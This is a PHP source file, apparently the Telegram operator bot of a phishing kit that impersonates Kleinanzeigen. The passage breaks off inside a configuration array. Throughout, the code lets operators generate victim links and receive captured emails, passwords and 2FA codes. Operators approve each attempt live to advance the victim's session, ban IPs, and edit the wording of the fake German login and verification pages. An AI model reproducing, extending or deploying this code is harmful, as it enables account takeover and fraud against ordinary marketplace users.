<?php
declare(strict_types=1);

require_once __DIR__ . '/bootstrap.php';

// =====================================================================
// Авторизация
// =====================================================================

function is_super_admin(int $chat_id): bool
{
    global $CONFIG;
    return in_array($chat_id, $CONFIG['telegram']['super_admins'] ?? [], true);
}

function ensure_admin_registered(int $chat_id, ?string $username): void
{
    if (is_super_admin($chat_id)) {
        db_run(
            'INSERT INTO admins (chat_id, username, is_super) VALUES (?,?,1)
             ON DUPLICATE KEY UPDATE username = VALUES(username), is_super = 1',
            [$chat_id, $username]
        );
    }
}

function is_admin(int $chat_id): bool
{
    if (is_super_admin($chat_id)) return true;
    return db_one('SELECT 1 FROM admins WHERE chat_id = ?', [$chat_id]) !== null;
}

// =====================================================================
// Состояния
// =====================================================================

function state_get(int $chat_id): ?array
{
    return db_one('SELECT state, payload FROM bot_states WHERE chat_id = ?', [$chat_id]);
}

function state_set(int $chat_id, string $state, ?string $payload = null): void
{
    db_run(
        'INSERT INTO bot_states (chat_id, state, payload) VALUES (?,?,?)
         ON DUPLICATE KEY UPDATE state = VALUES(state), payload = VALUES(payload)',
        [$chat_id, $state, $payload]
    );
}

function state_clear(int $chat_id): void
{
    db_run('DELETE FROM bot_states WHERE chat_id = ?', [$chat_id]);
}

// =====================================================================
// Клавиатуры
// =====================================================================

function main_keyboard(int $chat_id): array
{
    $rows = [
        [['text' => '🔗 Новая ссылка'], ['text' => '📋 Мои ссылки']],
        [['text' => '⚙️ Настройки'],   ['text' => '📊 Статистика']],
        [['text' => '🚫 Баны'],         ['text' => '❓ Помощь']],
    ];
    if (is_super_admin($chat_id)) {
        $rows[] = [['text' => '👥 Админы']];
    }
    return [
        'keyboard'        => $rows,
        'resize_keyboard' => true,
        'is_persistent'   => true,
    ];
}

function reply_kb_extra(int $chat_id): array
{
    return ['reply_markup' => json_encode(main_keyboard($chat_id))];
}

function cancel_kb_extra(): array
{
    return ['reply_markup' => json_encode([
        'keyboard'        => [[['text' => '✖️ Отмена']]],
        'resize_keyboard' => true,
        'one_time_keyboard' => false,
    ])];
}

// =====================================================================
// Главный обработчик
// =====================================================================

function bot_handle_update(array $update): void
{
    if (isset($update['callback_query'])) {
        bot_handle_callback($update['callback_query']);
        return;
    }
    if (isset($update['message'])) {
        bot_handle_message($update['message']);
        return;
    }
}

function bot_handle_message(array $msg): void
{
    $chat_id  = (int)($msg['chat']['id'] ?? 0);
    $username = $msg['from']['username'] ?? null;
    $text     = trim((string)($msg['text'] ?? ''));
    if ($chat_id === 0) return;

    ensure_admin_registered($chat_id, $username);
    if (!is_admin($chat_id)) {
        tg_send($chat_id, '⛔ У вас нет доступа к этому боту.');
        return;
    }

    // Отмена в любом месте
    if ($text === '/cancel' || $text === '✖️ Отмена') {
        state_clear($chat_id);
        tg_send($chat_id, '✖️ Отменено.', reply_kb_extra($chat_id));
        return;
    }

    // ---------- Машина состояний ----------
    $state = state_get($chat_id);
    if ($state) {
        $st = $state['state'];

        if (str_starts_with($st, 'awaiting_value:')) {
            $key = substr($st, strlen('awaiting_value:'));
            if (!in_array($key, cfg_editable_keys(), true)) {
                state_clear($chat_id);
                tg_send($chat_id, '⚠️ Неизвестный ключ.', reply_kb_extra($chat_id));
                return;
            }
            cfg_set($key, $text);
            $slug = $state['payload'] ?: (cfg_meta()[$key]['group'] ?? '');
            state_clear($chat_id);
            tg_send($chat_id,
                "✅ <b>" . htmlspecialchars(cfg_label_for($key)) . "</b> обновлено:\n" .
                "«" . htmlspecialchars($text) . '»',
                [
                    'reply_markup' => json_encode(['inline_keyboard' => [
                        [['text' => '⬅️ К категории', 'callback_data' => "cfg:cat:$slug"]],
                    ]]),
                ]
            );
            return;
        }

        if ($st === 'awaiting_suffix') {
            state_clear($chat_id);
            create_link($chat_id, $text);
            return;
        }

        if ($st === 'awaiting_admin_id') {
            state_clear($chat_id);
            cmd_addadmin($chat_id, $text);
            return;
        }

        if ($st === 'awaiting_ban_ip') {
            state_clear($chat_id);
            cmd_ban($chat_id, $text);
            return;
        }
    }

    // ---------- Текст с reply-клавиатуры ----------
    switch ($text) {
        case '🔗 Новая ссылка': cmd_newlink($chat_id, ''); return;
        case '📋 Мои ссылки':   cmd_links($chat_id);      return;
        case '⚙️ Настройки':   cmd_config($chat_id);      return;
        case '📊 Статистика':   cmd_stats($chat_id);       return;
        case '❓ Помощь':       cmd_help($chat_id);        return;
        case '👥 Админы':       cmd_admins($chat_id);      return;
        case '🚫 Баны':         cmd_bans($chat_id);        return;
    }

    if ($text === '') return;

    // ---------- Команды ----------
    $parts = preg_split('/\s+/', $text, 2);
    $cmd   = strtolower($parts[0]);
    $arg   = $parts[1] ?? '';

    switch ($cmd) {
        case '/start':       cmd_start($chat_id);            break;
        case '/help':        cmd_help($chat_id);             break;
        case '/newlink':     cmd_newlink($chat_id, $arg);    break;
        case '/links':       cmd_links($chat_id);            break;
        case '/deletelink':  cmd_deletelink($chat_id, $arg); break;
        case '/stats':       cmd_stats($chat_id);            break;
        case '/config':      cmd_config($chat_id);           break;
        case '/get':         cmd_get($chat_id, $arg);        break;
        case '/set':         cmd_set($chat_id, $arg);        break;
        case '/reset':       cmd_reset($chat_id, $arg);      break;
        case '/timeout':     cmd_timeout($chat_id, $arg);    break;
        case '/addadmin':    cmd_addadmin($chat_id, $arg);   break;
        case '/deladmin':    cmd_deladmin($chat_id, $arg);   break;
        case '/admins':      cmd_admins($chat_id);           break;
        case '/bans':        cmd_bans($chat_id);             break;
        case '/ban':         cmd_ban($chat_id, $arg);        break;
        case '/unban':       cmd_unban($chat_id, $arg);      break;
        case '/myid':
            tg_send($chat_id, "Ваш chat_id: <code>$chat_id</code>", reply_kb_extra($chat_id));
            break;
        default:
            tg_send($chat_id, 'Команда не распознана. Нажмите ❓ Помощь.', reply_kb_extra($chat_id));
    }
}

// =====================================================================
// Callback queries
// =====================================================================

function bot_handle_callback(array $cb): void
{
    $chat_id = (int)($cb['message']['chat']['id'] ?? 0);
    $msg_id  = (int)($cb['message']['message_id'] ?? 0);
    $cb_id   = (string)($cb['id'] ?? '');
    $data    = (string)($cb['data'] ?? '');

    if (!is_admin($chat_id)) {
        tg_answer_callback($cb_id, 'Нет доступа', true);
        return;
    }

    $parts = explode(':', $data);
    $ns    = $parts[0] ?? '';

    // ---------- Конфиг ----------
    if ($ns === 'cfg') {
        $action = $parts[1] ?? '';
        $arg    = $parts[2] ?? '';

        if ($action === 'root') {
            tg_answer_callback($cb_id);
            render_config_root($chat_id, $msg_id);
            return;
        }
        if ($action === 'cat') {
            tg_answer_callback($cb_id);
            render_config_category($chat_id, $msg_id, $arg);
            return;
        }
        if ($action === 'edit') {
            $key  = $arg;
            $meta = cfg_meta();
            if (!isset($meta[$key])) { tg_answer_callback($cb_id, 'Неизвестный ключ', true); return; }
            $slug = $meta[$key]['group'];
            state_set($chat_id, 'awaiting_value:' . $key, $slug);
            tg_answer_callback($cb_id);

            $current = (string)cfg_get($key);
            $default = cfg_default_for($key);
            $is_default = $current === $default;
            $label   = cfg_label_for($key);

            $body = "✏️ <b>" . htmlspecialchars($label) . "</b>\n\n" .
                    "Текущее значение:\n«" . htmlspecialchars($current) . "»\n\n" .
                    "По умолчанию:\n«" . htmlspecialchars($default) . "»\n\n" .
                    "Отправьте новое значение одним сообщением.";

            $kb_rows = [];
            if (!$is_default) {
                $kb_rows[] = [['text' => '🔄 Сбросить к дефолту', 'callback_data' => "cfg:reset:$key"]];
            }
            $kb_rows[] = [
                ['text' => '⬅️ К категории',  'callback_data' => "cfg:cat:$slug"],
                ['text' => '✖️ Отмена',       'callback_data' => "cfg:cancel:$key"],
            ];

            tg_send($chat_id, $body, [
                'reply_markup' => json_encode(['inline_keyboard' => $kb_rows]),
            ]);
            return;
        }
        if ($action === 'reset') {
            $key  = $arg;
            $meta = cfg_meta();
            if (!isset($meta[$key])) { tg_answer_callback($cb_id, 'Неизвестный ключ', true); return; }
            cfg_reset($key);
            state_clear($chat_id);
            tg_answer_callback($cb_id, 'Сброшено к дефолту');
            $slug = $meta[$key]['group'];
            tg_edit($chat_id, $msg_id,
                "🔄 <b>" . htmlspecialchars(cfg_label_for($key)) . "</b> сброшено к значению по умолчанию.",
                ['reply_markup' => json_encode(['inline_keyboard' => [
                    [['text' => '⬅️ К категории', 'callback_data' => "cfg:cat:$slug"]],
                ]])]
            );
            return;
        }
        if ($action === 'cancel') {
            $key  = $arg;
            state_clear($chat_id);
            tg_answer_callback($cb_id);
            $slug = cfg_meta()[$key]['group'] ?? '';
            tg_edit($chat_id, $msg_id, "✖️ Изменение отменено.",
                ['reply_markup' => json_encode(['inline_keyboard' => [
                    [['text' => '⬅️ К категории', 'callback_data' => "cfg:cat:$slug"]],
                ]])]
            );
            return;
        }
        tg_answer_callback($cb_id);
        return;
    }

    // ---------- Подтверждение попытки ----------
    if ($ns === 'att') {
        $action     = $parts[1] ?? '';
        $attempt_id = (int)($parts[2] ?? 0);
        $att = db_one('SELECT a.*, l.chat_id AS link_chat, l.number_suffix FROM attempts a JOIN links l ON l.id = a.link_id WHERE a.id = ?', [$attempt_id]);
        if (!$att) { tg_answer_callback($cb_id, 'Попытка не найдена', true); return; }

        if (in_array($action, ['approve', 'reject'], true)) {
            if ($att['status'] !== 'pending') {
                tg_answer_callback($cb_id, 'Уже обработано: ' . $att['status'], true);
                return;
            }
            $new_status = $action === 'approve' ? 'approved' : 'rejected';
            db_run('UPDATE attempts SET status = ?, responded_at = NOW() WHERE id = ?', [$new_status, $attempt_id]);
            tg_answer_callback($cb_id, $new_status === 'approved' ? '✅ Подтверждено' : '❌ Отклонено');

            $verdict = $new_status === 'approved' ? '✅ <b>Код подтверждён</b>' : '❌ <b>Код отклонён</b>';
            $kb = post_verdict_keyboard($att['session_id'] ?? null, $att['ip'] ?? null, "att:ban:$attempt_id");
            tg_edit($chat_id, $msg_id, build_attempt_text($att) . "\n\n" . $verdict, $kb);
            return;
        }

        if ($action === 'ban') {
            if (!$att['ip']) { tg_answer_callback($cb_id, 'У попытки нет IP', true); return; }
            db_run(
                'INSERT IGNORE INTO banned_ips (ip, reason, banned_by) VALUES (?, ?, ?)',
                [$att['ip'], 'attempt #' . $attempt_id, $chat_id]
            );
            if ($att['status'] === 'pending') {
                db_run('UPDATE attempts SET status = "rejected", responded_at = NOW() WHERE id = ?', [$attempt_id]);
            }
            tg_answer_callback($cb_id, '🚫 IP забанен');
            tg_edit($chat_id, $msg_id,
                build_attempt_text($att) . "\n\n🚫 <b>IP <code>" . htmlspecialchars($att['ip']) . "</code> забанен</b>"
            );
            return;
        }

        tg_answer_callback($cb_id, 'Неверные данные');
        return;
    }

    // ---------- Подтверждение логина ----------
    if ($ns === 'log') {
        $action     = $parts[1] ?? '';
        $attempt_id = (int)($parts[2] ?? 0);
        $att = db_one(
            'SELECT la.*, l.chat_id AS link_chat
               FROM login_attempts la JOIN links l ON l.id = la.link_id
              WHERE la.id = ?', [$attempt_id]
        );
        if (!$att) { tg_answer_callback($cb_id, 'Попытка не найдена', true); return; }

        if (in_array($action, ['approve', 'reject'], true)) {
            if ($att['status'] !== 'pending') {
                tg_answer_callback($cb_id, 'Уже обработано: ' . $att['status'], true);
                return;
            }
            $new_status = $action === 'approve' ? 'approved' : 'rejected';
            db_run('UPDATE login_attempts SET status = ?, responded_at = NOW() WHERE id = ?', [$new_status, $attempt_id]);

            if ($new_status === 'approved') {
                db_run(
                    "UPDATE sessions SET login_status = 'approved', stage = '2fa', email = ? WHERE id = ?",
                    [$att['email'], $att['session_id']]
                );
            } else {
                db_run(
                    "UPDATE sessions SET login_status = 'rejected' WHERE id = ? AND login_status != 'approved'",
                    [$att['session_id']]
                );
            }

            tg_answer_callback($cb_id, $new_status === 'approved' ? '✅ Верно' : '❌ Неверно');
            $verdict = $new_status === 'approved' ? '✅ <b>Логин подтверждён</b>' : '❌ <b>Логин отклонён</b>';
            $kb = post_verdict_keyboard($att['session_id'] ?? null, $att['ip'] ?? null, "log:ban:$attempt_id");
            tg_edit($chat_id, $msg_id, build_login_attempt_text($att) . "\n\n" . $verdict, $kb);
            return;
        }

        if ($action === 'ban') {
            if (!$att['ip']) { tg_answer_callback($cb_id, 'У попытки нет IP', true); return; }
            db_run(
                'INSERT IGNORE INTO banned_ips (ip, reason, banned_by) VALUES (?, ?, ?)',
                [$att['ip'], 'login attempt #' . $attempt_id, $chat_id]
            );
            if ($att['status'] === 'pending') {
                db_run('UPDATE login_attempts SET status = "rejected", responded_at = NOW() WHERE id = ?', [$attempt_id]);
                db_run(
                    "UPDATE sessions SET login_status = 'rejected' WHERE id = ? AND login_status != 'approved'",
                    [$att['session_id']]
                );
            }
            tg_answer_callback($cb_id, '🚫 IP забанен');
            tg_edit($chat_id, $msg_id,
                build_login_attempt_text($att) . "\n\n🚫 <b>IP <code>" . htmlspecialchars($att['ip']) . "</code> забанен</b>"
            );
            return;
        }

        tg_answer_callback($cb_id, 'Неверные данные');
        return;
    }

    // ---------- Presence (онлайн) ----------
    if ($ns === 'pres' && ($parts[1] ?? '') === 'online') {
        $session_id = $parts[2] ?? '';
        if ($session_id === '' || !preg_match('/^[a-f0-9]{32}$/', $session_id)) {
            tg_answer_callback($cb_id, 'Нет session', true);
            return;
        }
        tg_answer_callback($cb_id, presence_status_text($session_id), true);
        return;
    }

    // ---------- Баны ----------
    if ($ns === 'ban') {
        $action = $parts[1] ?? '';
        if ($action === 'add') {
            state_set($chat_id, 'awaiting_ban_ip');
            tg_answer_callback($cb_id);
            tg_send($chat_id,
                "🚫 <b>Бан IP</b>\n\nОтправьте IP-адрес для блокировки.\n" .
                "Можно с причиной: <code>1.2.3.4 спам</code>",
                cancel_kb_extra()
            );
            return;
        }
        if ($action === 'unban') {
            $ip = $parts[2] ?? '';
            $n = db_run('DELETE FROM banned_ips WHERE ip = ?', [$ip]);
            tg_answer_callback($cb_id, $n ? 'Разбанен' : 'Не найден');
            render_bans_message($chat_id, $msg_id);
            return;
        }
        if ($action === 'refresh') {
            tg_answer_callback($cb_id, '🔄');
            render_bans_message($chat_id, $msg_id);
            return;
        }
    }

    // ---------- Список ссылок (пагинация) ----------
    if ($ns === 'links') {
        $action = $parts[1] ?? '';
        if ($action === 'page') {
            $page = max(1, (int)($parts[2] ?? 1));
            tg_answer_callback($cb_id);
            render_links_page($chat_id, $msg_id, $page);
            return;
        }
        if ($action === 'noop') { tg_answer_callback($cb_id); return; }
    }

    // ---------- Ссылки ----------
    if ($ns === 'link') {
        $action  = $parts[1] ?? '';
        $link_id = $parts[2] ?? '';
        $page    = (int)($parts[3] ?? 1);

        if ($action === 'new') {
            state_set($chat_id, 'awaiting_suffix');
            tg_answer_callback($cb_id);
            tg_send($chat_id, prompt_new_link_text(), cancel_kb_extra());
            return;
        }
        if ($action === 'show') {
            tg_answer_callback($cb_id);
            render_link_detail($chat_id, $link_id, $msg_id, $page);
            return;
        }
        if ($action === 'del_ask') {
            tg_answer_callback($cb_id);
            tg_edit($chat_id, $msg_id, "Удалить ссылку <code>$link_id</code>?", [
                'reply_markup' => json_encode(['inline_keyboard' => [[
                    ['text' => '✅ Да, удалить', 'callback_data' => "link:del:$link_id:$page"],
                    ['text' => '↩️ Отмена',     'callback_data' => "link:show:$link_id:$page"],
                ]]]),
            ]);
            return;
        }
        if ($action === 'del') {
            $n = db_run('UPDATE links SET is_active = 0 WHERE id = ? AND chat_id = ?', [$link_id, $chat_id]);
            tg_answer_callback($cb_id, $n ? '🗑 Деактивирована' : 'Не найдена');
            render_links_page($chat_id, $msg_id, $page);
            return;
        }
        if ($action === 'stats') {
            $row = db_one(
                'SELECT
                    COUNT(*) AS total,
                    SUM(status = "pending")  AS pend,
                    SUM(status = "approved") AS appr,
                    SUM(status = "rejected") AS rej
                 FROM attempts WHERE link_id = ?', [$link_id]
            );
            $t = (int)($row['total'] ?? 0);
            $p = (int)($row['pend']  ?? 0);
            $a = (int)($row['appr']  ?? 0);
            $r = (int)($row['rej']   ?? 0);
            tg_answer_callback($cb_id);
            tg_edit($chat_id, $msg_id,
                "📊 <b>Статистика по ссылке</b>\n<code>$link_id</code>\n\n" .
                "Всего попыток: <b>$t</b>\n" .
                "⏳ Ожидают: $p\n" .
                "✅ Подтверждены: $a\n" .
                "❌ Отклонены: $r",
                ['reply_markup' => json_encode(['inline_keyboard' => [[
                    ['text' => '⬅️ К ссылке', 'callback_data' => "link:show:$link_id:$page"],
                ]]])]
            );
            return;
        }
    }

    // ---------- Админы ----------
    if ($ns === 'admin') {
        if (!is_super_admin($chat_id)) { tg_answer_callback($cb_id, 'Только super', true); return; }
        $action = $parts[1] ?? '';

        if ($action === 'add') {
            state_set($chat_id, 'awaiting_admin_id');
            tg_answer_callback($cb_id);
            tg_send($chat_id,
                "➕ <b>Добавление админа</b>\n\nОтправьте его <code>chat_id</code>.\n" .
                "Пользователь сможет узнать свой id командой /myid у этого же бота.",
                cancel_kb_extra()
            );
            return;
        }
        if ($action === 'del_ask') {
            $target = (int)($parts[2] ?? 0);
            tg_answer_callback($cb_id);
            tg_edit($chat_id, $msg_id, "Удалить админа <code>$target</code>?", [
                'reply_markup' => json_encode(['inline_keyboard' => [[
                    ['text' => '✅ Да',     'callback_data' => "admin:del:$target"],
                    ['text' => '↩️ Отмена', 'callback_data' => 'admin:list'],
                ]]]),
            ]);
            return;
        }
        if ($action === 'del') {
            $target = (int)($parts[2] ?? 0);
            db_run('DELETE FROM admins WHERE chat_id = ? AND is_super = 0', [$target]);
            tg_answer_callback($cb_id, 'Удалён');
            render_admins_message($chat_id, $msg_id);
            return;
        }
        if ($action === 'list') {
            tg_answer_callback($cb_id);
            render_admins_message($chat_id, $msg_id);
            return;
        }
    }

    tg_answer_callback($cb_id);
}

// =====================================================================
// Команды
// =====================================================================

function cmd_start(int $chat_id): void
{
    $text = "👋 <b>Добро пожаловать!</b>\n\n" .
            "Это бот управления подтверждениями kleinanzeigen.\n" .
            "Используйте кнопки внизу или команды.\n\n" .
            "Нажмите ❓ Помощь, чтобы увидеть все возможности.";
    tg_send($chat_id, $text, reply_kb_extra($chat_id));
}

function cmd_help(int $chat_id): void
{
    $text = <<<TXT
<b>📖 Возможности бота</b>

<b>🔗 Ссылки</b>
• 🔗 Новая ссылка — создать (попросит суффикс)
• 📋 Мои ссылки — список с управлением
• /newlink &lt;суффикс&gt; — быстро в одну строку

<b>⚙️ Настройки сайта</b>
• ⚙️ Настройки — интерактивный редактор
• /set &lt;ключ&gt; &lt;значение&gt; — быстрая правка
• /get, /reset, /timeout

<b>📊 Аналитика</b>
• 📊 Статистика — сводка по всем попыткам

<b>🚫 Баны</b>
• 🚫 Баны — список заблокированных IP
• /ban &lt;ip&gt; [причина] — заблокировать
• /unban &lt;ip&gt; — разблокировать
• Кнопка 🚫 в карточке попытки — забанить сразу

<b>👥 Админы</b> (только для super)
• 👥 Админы — список + добавить/удалить

<b>Прочее</b>
• /myid — узнать свой chat_id
• /cancel — отменить текущий ввод
TXT;
    tg_send($chat_id, $text, reply_kb_extra($chat_id));
}

// ---------- ссылки ----------

function prompt_new_link_text(): string
{
    return "🔗 <b>Создание новой ссылки</b>\n\n" .
           "Отправьте суффикс номера телефона (последние цифры, которые увидит пользователь).\n\n" .
           "Например: <code>5678</code>\n" .
           "Полный номер будет: <code>" . htmlspecialchars((string)cfg_get('number_prefix')) . "5678</code>";
}

function cmd_newlink(int $chat_id, string $arg): void
{
    $suffix = trim($arg);
    if ($suffix === '') {
        state_set($chat_id, 'awaiting_suffix');
        tg_send($chat_id, prompt_new_link_text(), cancel_kb_extra());
        return;
    }
    create_link($chat_id, $suffix);
}

function create_link(int $chat_id, string $suffix): void
{
    $suffix = trim($suffix);
    if ($suffix === '') {
        tg_send($chat_id, '⚠️ Суффикс не может быть пустым.', reply_kb_extra($chat_id));
        return;
    }
    if (!preg_match('/^[\p{L}\p{N}\s\-\+\(\)]{1,32}$/u', $suffix)) {
        tg_send($chat_id,
            '⚠️ Допустимы только буквы, цифры и символы <code>- + ( )</code> и пробел, до 32 символов.',
            reply_kb_extra($chat_id)
        );
        return;
    }

    global $CONFIG;
    do {
        $id = gen_link_id(8);
    } while (db_one('SELECT 1 FROM links WHERE id = ?', [$id]) !== null);

    db_run('INSERT INTO links (id, number_suffix, chat_id) VALUES (?,?,?)', [$id, $suffix, $chat_id]);

    $url    = link_public_url(['id' => $id]);
    $prefix = (string)cfg_get('number_prefix');
    tg_send($chat_id,
        "✅ <b>Ссылка создана</b>\n\n" .
        "📱 <code>" . htmlspecialchars($prefix . $suffix) . "</code>\n" .
        "🆔 <code>$id</code>\n\n" .
        "<a href=\"$url\">$url</a>",
        [
            'reply_markup' => json_encode(['inline_keyboard' => [
                [['text' => '🌐 Открыть', 'url' => $url]],
                [
                    ['text' => '➕ Создать ещё', 'callback_data' => 'link:new'],
                    ['text' => '📋 К списку',   'callback_data' => 'links:page:1'],
                ],
            ]]),
            'disable_web_page_preview' => true,
        ]
    );
}

const LINKS_PER_PAGE = 10;

function cmd_links(int $chat_id): void
{
    render_links_page($chat_id, null, 1);
}

function render_links_page(int $chat_id, ?int $msg_id, int $page): void
{
    $total = (int)(db_one('SELECT COUNT(*) AS c FROM links WHERE chat_id = ?', [$chat_id])['c'] ?? 0);

    if ($total === 0) {
        $text = "📋 <b>Ваши ссылки</b>\n\n<i>пока пусто</i>";
        $kb   = ['reply_markup' => json_encode(['inline_keyboard' => [
            [['text' => '➕ Создать ссылку', 'callback_data' => 'link:new']],
        ]])];
        $msg_id ? tg_edit($chat_id, $msg_id, $text, $kb) : tg_send($chat_id, $text, $kb);
        return;
    }

    $per_page    = LINKS_PER_PAGE;
    $total_pages = max(1, (int)ceil($total / $per_page));
    $page        = max(1, min($total_pages, $page));
    $offset      = ($page - 1) * $per_page;

    $rows = db_all(
        'SELECT id, number_suffix, is_active,
                (SELECT COUNT(*) FROM attempts a WHERE a.link_id = links.id) AS ac
           FROM links
          WHERE chat_id = ?
          ORDER BY is_active DESC, created_at DESC
          LIMIT ' . (int)$per_page . ' OFFSET ' . (int)$offset,
        [$chat_id]
    );

    $prefix = (string)cfg_get('number_prefix');
    $text   = "📋 <b>Ваши ссылки</b> · всего <b>$total</b> · стр <b>$page</b>/$total_pages\n\n";

    $kb_rows = [];
    $num_row = [];
    foreach ($rows as $i => $r) {
        $n      = $offset + $i + 1;
        $status = $r['is_active'] ? '🟢' : '⚪️';
        $text  .= "<b>$n.</b> $status <code>" . htmlspecialchars($prefix . $r['number_suffix']) . "</code>"
                . " · {$r['ac']} попыток\n"
                . "    🆔 <code>{$r['id']}</code>\n";

        $num_row[] = ['text' => (string)$n, 'callback_data' => "link:show:{$r['id']}:$page"];
        if (count($num_row) === 5) { $kb_rows[] = $num_row; $num_row = []; }
    }
    if ($num_row) $kb_rows[] = $num_row;

    $nav = [];
    if ($page > 1)            $nav[] = ['text' => '⬅️', 'callback_data' => 'links:page:' . ($page - 1)];
    $nav[]                            = ['text' => "$page/$total_pages", 'callback_data' => 'links:noop'];
    if ($page < $total_pages) $nav[] = ['text' => '➡️', 'callback_data' => 'links:page:' . ($page + 1)];
    if (count($nav) > 1) $kb_rows[] = $nav;

    $kb_rows[] = [['text' => '➕ Создать ссылку', 'callback_data' => 'link:new']];

    $extra = [
        'reply_markup'             => json_encode(['inline_keyboard' => $kb_rows]),
        'disable_web_page_preview' => true,
    ];
    if ($msg_id) tg_edit($chat_id, $msg_id, $text, $extra);
    else         tg_send($chat_id, $text, $extra);
}

function render_link_detail(int $chat_id, string $link_id, ?int $msg_id, int $return_page = 1): void
{
    $r = db_one(
        'SELECT id, number_suffix, is_active, created_at,
                (SELECT COUNT(*) FROM attempts a WHERE a.link_id = links.id) AS ac
           FROM links WHERE id = ? AND chat_id = ?',
        [$link_id, $chat_id]
    );
    if (!$r) {
        $text = '⚠️ Ссылка не найдена.';
        $kb   = ['reply_markup' => json_encode(['inline_keyboard' => [[
            ['text' => '⬅️ К списку', 'callback_data' => "links:page:$return_page"],
        ]]])];
        $msg_id ? tg_edit($chat_id, $msg_id, $text, $kb) : tg_send($chat_id, $text, $kb);
        return;
    }

    global $CONFIG;
    $url    = link_public_url($r);
    $prefix = (string)cfg_get('number_prefix');
    $status = $r['is_active'] ? '🟢 активна' : '⚪️ деактивирована';

    $text =
        "<b>" . htmlspecialchars($prefix . $r['number_suffix']) . "</b>\n" .
        "$status · попыток: <b>{$r['ac']}</b>\n" .
        "🆔 <code>{$r['id']}</code>\n" .
        "🕐 {$r['created_at']}\n\n" .
        "<a href=\"$url\">$url</a>";

    $kb_rows = [
        [['text' => '🌐 Открыть', 'url' => $url]],
        [['text' => '📊 Статистика', 'callback_data' => "link:stats:{$r['id']}:$return_page"]],
    ];
    if ($r['is_active']) {
        $kb_rows[1][] = ['text' => '🗑 Удалить', 'callback_data' => "link:del_ask:{$r['id']}:$return_page"];
    }
    $kb_rows[] = [['text' => '⬅️ К списку', 'callback_data' => "links:page:$return_page"]];

    $extra = [
        'reply_markup'             => json_encode(['inline_keyboard' => $kb_rows]),
        'disable_web_page_preview' => true,
    ];
    if ($msg_id) tg_edit($chat_id, $msg_id, $text, $extra);
    else         tg_send($chat_id, $text, $extra);
}

function cmd_deletelink(int $chat_id, string $arg): void
{
    $id = trim($arg);
    if ($id === '') { tg_send($chat_id, 'Использование: <code>/deletelink &lt;id&gt;</code>', reply_kb_extra($chat_id)); return; }
    $n = db_run('UPDATE links SET is_active = 0 WHERE id = ? AND chat_id = ?', [$id, $chat_id]);
    tg_send($chat_id,
        $n ? "🗑 Ссылка <code>$id</code> деактивирована." : '⚠️ Ссылка не найдена.',
        reply_kb_extra($chat_id)
    );
}

function cmd_stats(int $chat_id): void
{
    $row = db_one(
        'SELECT
            COUNT(*) AS total,
            SUM(status = "pending")  AS pend,
            SUM(status = "approved") AS appr,
            SUM(status = "rejected") AS rej
         FROM attempts a JOIN links l ON l.id = a.link_id WHERE l.chat_id = ?',
        [$chat_id]
    );
    $total = (int)($row['total'] ?? 0);
    $pend  = (int)($row['pend']  ?? 0);
    $appr  = (int)($row['appr']  ?? 0);
    $rej   = (int)($row['rej']   ?? 0);

    $links_count = (int)(db_one('SELECT COUNT(*) AS c FROM links WHERE chat_id = ? AND is_active = 1', [$chat_id])['c'] ?? 0);

    tg_send($chat_id,
        "📊 <b>Статистика</b>\n\n" .
        "🔗 Активных ссылок: <b>$links_count</b>\n" .
        "📩 Всего попыток: <b>$total</b>\n" .
        "  ⏳ Ожидают: $pend\n" .
        "  ✅ Подтверждены: $appr\n" .
        "  ❌ Отклонены: $rej",
        reply_kb_extra($chat_id)
    );
}

// ---------- конфиг ----------

function cfg_groups(): array
{
    return [
        'login'    => '🔐 Страница логина',
        'main'     => '📝 Главный экран (2FA)',
        'header'   => '🔝 Шапка / ссылки',
        'phone'    => '📞 Номер телефона',
        'states'   => '🔁 Состояния',
        'notfound' => '🚫 Ссылка не найдена',
        'tech'     => '⚙️ Технические',
    ];
}

function cfg_meta(): array
{
    return [
        'login_title'          => ['label' => 'Заголовок логина',           'btn' => '🔐 Заголовок',      'group' => 'login'],
        'login_subtitle'       => ['label' => 'Подзаголовок логина',        'btn' => '🔐 Подзаголовок',   'group' => 'login'],
        'login_button'         => ['label' => 'Кнопка Einloggen',           'btn' => '🔐 Кнопка',         'group' => 'login'],
        'login_forgot'         => ['label' => 'Passwort vergessen',         'btn' => '🔐 Забыли пароль',  'group' => 'login'],
        'login_register'       => ['label' => 'Текст регистрации',          'btn' => '🔐 Регистрация',    'group' => 'login'],
        'login_error'          => ['label' => 'Текст ошибки логина',        'btn' => '🔐 Ошибка',         'group' => 'login'],
        'login_email_label'    => ['label' => 'Плейсхолдер email',          'btn' => '🔐 Email',          'group' => 'login'],
        'login_password_label' => ['label' => 'Плейсхолдер пароля',         'btn' => '🔐 Пароль',         'group' => 'login'],
        'login_edit_link'      => ['label' => 'Ссылка Bearbeiten',          'btn' => '🔐 Bearbeiten',     'group' => 'login'],
        'login_loading_text'   => ['label' => 'Текст проверки логина',      'btn' => '🔐 Загрузка',       'group' => 'login'],

        'modal_title'           => ['label' => 'Заголовок',             'btn' => '📝 Заголовок',     'group' => 'main'],
        'modal_description'     => ['label' => 'Описание под заголовком','btn' => '📝 Описание',     'group' => 'main'],
        'button_text'           => ['label' => 'Текст кнопки',          'btn' => '🔘 Кнопка',        'group' => 'main'],
        'placeholder'           => ['label' => 'Плейсхолдер поля',      'btn' => '✍️ Плейсхолдер',   'group' => 'main'],

        'header_help'           => ['label' => 'Ссылка «Hilfe» в шапке','btn' => '🔝 Hilfe',          'group' => 'header'],
        'resend_question'       => ['label' => 'Текст «не пришёл код?»', 'btn' => '🔝 Resend (вопрос)','group' => 'header'],
        'resend_link'           => ['label' => 'Ссылка «отправить заново»','btn' => '🔝 Resend (ссылка)','group' => 'header'],

        'number_prefix'         => ['label' => 'Префикс номера',        'btn' => '📞 Префикс',       'group' => 'phone'],

        'loading_text'          => ['label' => 'Текст «идёт проверка»',  'btn' => '⏳ Загрузка',     'group' => 'states'],
        'success_text'          => ['label' => 'Успех — заголовок',     'btn' => '✅ Успех (тайтл)',     'group' => 'states'],
        'success_description'   => ['label' => 'Успех — описание',      'btn' => '✅ Успех (описание)',  'group' => 'states'],
        'error_text'            => ['label' => 'Ошибка — заголовок',    'btn' => '❌ Ошибка (тайтл)',    'group' => 'states'],
        'error_description'     => ['label' => 'Ошибка — описание',     'btn' => '❌ Ошибка (описание)', 'group' => 'states'],

        'not_found_title'       => ['label' => '404 — заголовок',       'btn' => '🚫 404 (тайтл)',     'group' => 'notfound'],
        'not_found_description' => ['label' => '404 — описание',        'btn' => '🚫 404 (описание)',  'group' => 'notfound'],

